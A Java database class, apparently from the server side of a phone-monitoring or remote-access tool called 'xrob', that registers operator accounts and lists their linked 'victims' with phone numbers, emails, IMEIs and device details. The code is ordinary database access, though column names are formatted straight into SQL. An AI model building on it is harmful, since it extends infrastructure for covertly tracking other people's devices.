package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Client;
import com.theah64.xrob.api.models.Victim;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/**
 * Created by theapache64 on 11/9/16,2:06 PM.
 */
public class Clients extends BaseTable<Client> {

    public static final String COLUMN_CLIENT_CODE = "client_code";
    public static final String COLUMN_USERNAME = "username";
    public static final java.lang.String COLUMN_PASS_HASH = "pass_hash";
    public static final String KEY_PASSWORD = "password";
    public static final String KEY_C_PASSWORD = "cpassword";
    public static final String COLUMN_EMAIL = "email";
    public static final String REGEX_USERNAME = "^[a-z0-9]{6,20}$";
    public static final String REGEX_EMAIL = "^[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@[A-Za-z0-9-]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})$";
    public static final int API_KEY_LENGTH = 10;
    public static final String REGEX_CLIENT_CODE = "^[0-9]{10}$";
    private static final String TABLE_NAME_CLIENTS = "clients";

    private Clients() {
    }

    private static final Clients instance = new Clients();

    public static Clients getInstance() {
        return instance;
    }

    @Override
    public String get(String byColumn, String byValues, String columnToReturn) {

        String valueToReturn = null;
        final String query = String.format("SELECT %s FROM clients WHERE %s = ? LIMIT 1", columnToReturn, byColumn);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, byValues);
            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                valueToReturn = rs.getString(columnToReturn);
            }
            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return valueToReturn;
    }

    @Override
    protected boolean isExist(Client client) {
        return isExist(COLUMN_CLIENT_CODE, client.getClientCode());
    }

    @Override
    public boolean add(Client client) {
        return addv3(client) != null;
    }

    @Override

    public String addv3(Client client) {

        String clientId = null;
        final String addClientQuery = "INSERT INTO clients (username, pass_hash, api_key,email,client_code) VALUES (?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();

        //To track the success

        try {
            final PreparedStatement ps = con.prepareStatement(addClientQuery, PreparedStatement.RETURN_GENERATED_KEYS);

            ps.setString(1, client.getUsername());
            ps.setString(2, client.getPassHash());
            ps.setString(3, client.getApiKey());
            ps.setString(4, client.getEmail());
            ps.setString(5, client.getClientCode());

            if (ps.executeUpdate() == 1) {
                final ResultSet rs = ps.getGeneratedKeys();
                if (rs.first()) {
                    clientId = rs.getString(1);
                }
                rs.close();
            }


            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return clientId;
    }

    @Override
    public Client get(@NotNull String column1, @NotNull String value1, @Nullable String column2, @Nullable String value2) {

        if (column1 == null || value1 == null) {
            throw new IllegalArgumentException("column1 or value1  can't be null");
        }

        String query;
        final boolean isSingleColumnMatch = column2 == null && value2 == null;

        if (isSingleColumnMatch) {
            query = String.format("SELECT id,client_code,username,email,pass_hash FROM clients WHERE %s = ? LIMIT 1", column1);
        } else {
            query = String.format("SELECT id,client_code,username,email,pass_hash FROM clients WHERE %s = ? AND %s = ? LIMIT 1", column1, column2);
        }

        final java.sql.Connection con = Connection.getConnection();
        Client client = null;

        try {

            final PreparedStatement ps = con.prepareStatement(query);

            if (isSingleColumnMatch) {
                ps.setString(1, value1);
            } else {
                ps.setString(1, value1);
                ps.setString(2, value2);
            }

            final ResultSet rs = ps.executeQuery();

            if (rs.next()) {
                //Collecting relation
                final String id = rs.getString(COLUMN_ID);
                final String clientCode = rs.getString(COLUMN_CLIENT_CODE);
                final String username = rs.getString(COLUMN_USERNAME);
                final String email = rs.getString(COLUMN_EMAIL);
                final String passHash = rs.getString(COLUMN_PASS_HASH);
                client = new Client(id, username, passHash, null, email, clientCode);
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return client;
    }

    @Override
    public Client get(String column, String value) {
        return get(column, value, null, null);
    }

    public static Random random;

    public String getNewClientCode() {

        if (random == null) {
            random = new Random();
        }

        String clientCode;
        do {
            clientCode = String.valueOf((long) Math.floor(Math.random() * 9_000_000_000L) + 1_000_000_000L);
        } while (isExist(Clients.COLUMN_CLIENT_CODE, clientCode));

        return clientCode;
    }

    @Override
    public boolean isExist(String whereColumn, String whereColumnValue) {
        boolean isExist = false;
        final String query = String.format("SELECT id FROM clients WHERE %s = ? LIMIT 1", whereColumn);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, whereColumnValue);
            final ResultSet rs = ps.executeQuery();
            isExist = rs.first();
            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isExist;
    }

    public List<Victim> getVictims(String clientId) {
        List<Victim> victims = null;
        final String query = "SELECT v.id,v.name,v.phone,v.email,v.imei,v.device_name,v.other_device_info,v.victim_code FROM victims v INNER JOIN client_victim_relations cvr ON cvr.victim_id = v.id  WHERE cvr.client_id = ?";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, clientId);

            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                victims = new ArrayList<>();
                do {
                    final String id = rs.getString(Victims.COLUMN_ID);
                    final String name = rs.getString(Victims.COLUMN_NAME);
                    final String email = rs.getString(Victims.COLUMN_EMAIL);
                    final String phone = rs.getString(Victims.COLUMN_PHONE);
                    final String imei = rs.getString(Victims.COLUMN_IMEI);
                    final String deviceName = rs.getString(Victims.COLUMN_DEVICE_NAME);
                    final String otherDeviceInfo = rs.getString(Victims.COLUMN_OTHER_DEVICE_INFO);
                    final String victimCode = rs.getString(Victims.COLUMN_VICTIM_CODE);

                    victims.add(new Victim(id, name, email, phone, imei, null, null, null, deviceName, otherDeviceInfo, null, null, false, victimCode));

                } while (rs.next());
            }
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return victims;
    }

    @Override
    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
        return super.update(TABLE_NAME_CLIENTS, whereColumn, whereColumnValue, updateColumn, newUpdateColumnValue);
    }
}
